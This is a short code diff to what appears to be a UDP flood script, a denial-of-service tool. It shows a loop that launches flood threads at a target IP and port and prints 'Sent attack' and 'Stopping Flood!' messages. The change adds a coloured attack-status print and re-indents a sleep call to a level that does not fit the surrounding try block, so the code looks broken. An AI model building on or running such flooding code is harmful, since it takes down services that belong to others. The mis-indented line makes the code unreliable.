@@ -112,7 +112,8 @@ while True:
         u = udp(ip,port,size,packets)
         u.start()
         print("\033[33m[\033[1m+\033[33m] \033[92mRequest " +str(ip)+ "  \033[33mto Sent attack \033[97m  \033[96m-->  \033[95m" +port+ " \033[0m" )
-        time.sleep(1)
+        print("\033[48;5;6m\033[38;5;0m %s Info attack\033[0m \033[37m sent to \033[92m%s \033[36mPort \033[92m%s" % (sent, ip, port))
+     time.sleep(1)
     except KeyboardInterrupt:
         print ("Stopping Flood!")
         sys.exit()
